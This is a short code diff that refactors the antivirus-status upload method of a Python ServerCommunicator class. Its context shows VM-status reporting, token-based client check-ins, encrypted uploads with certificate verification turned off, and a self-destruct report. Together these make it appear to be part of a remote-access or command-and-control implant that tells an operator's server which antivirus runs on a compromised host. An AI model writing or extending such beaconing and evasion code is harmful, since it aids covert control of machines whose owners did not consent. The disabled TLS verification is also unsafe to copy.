@@ -150,41 +150,46 @@ class ServerCommunicator:
                 logging.error(f"VM status upload error: {str(e)}")
             raise CommunicationError(f"VM status upload error: {str(e)}")
 
-    def upload_antivirus_status(self, av_details: Dict) -> Dict:
-        """
-        ارسال وضعیت آنتی‌ویروس به سرور
-        """
+    def upload_antivirus_status(self, antivirus_data: Dict) -> Dict:
         try:
             if Config.DEBUG_MODE:
-                logging.info(f"Preparing antivirus status upload: client_id={self.client_id}")
-            av_details_json = json.dumps(av_details, ensure_ascii=False)
-            encrypted_av_details = self.encryption.encrypt(av_details_json)
+                logging.info(f"Antivirus status upload: client_id={self.client_id}")
+            
+            antivirus_data_json = json.dumps(antivirus_data, ensure_ascii=False)
+            encrypted_antivirus_data = self.encryption.encrypt(antivirus_data_json)
+            
             encrypted_data = {
                 "action": "upload_antivirus_status",
                 "client_id": self.client_id,
                 "token": self.token,
-                "av_details": encrypted_av_details
+                "antivirus_data": encrypted_antivirus_data
             }
+            
             if Config.DEBUG_MODE:
                 logging.info(f"Sending antivirus status: {encrypted_data}")
+            
             response = requests.post(
                 self.server_url,
                 data=encrypted_data,
                 timeout=Config.COMMAND_TIMEOUT,
                 verify=False
             )
+            
             if response.status_code != 200:
                 if Config.DEBUG_MODE:
                     logging.error(f"Antivirus status upload failed: status={response.status_code}, response={response.text}")
                 raise CommunicationError(f"Antivirus status upload failed: {response.text}")
+            
             if Config.DEBUG_MODE:
                 logging.info("Antivirus status upload successful")
+            
             return response.json()
+        
         except Exception as e:
             if Config.DEBUG_MODE:
                 logging.error(f"Antivirus status upload error: {str(e)}")
             raise CommunicationError(f"Antivirus status upload error: {str(e)}")
-
+        
     def report_self_destruct(self) -> Dict:
         try:
             if Config.DEBUG_MODE:
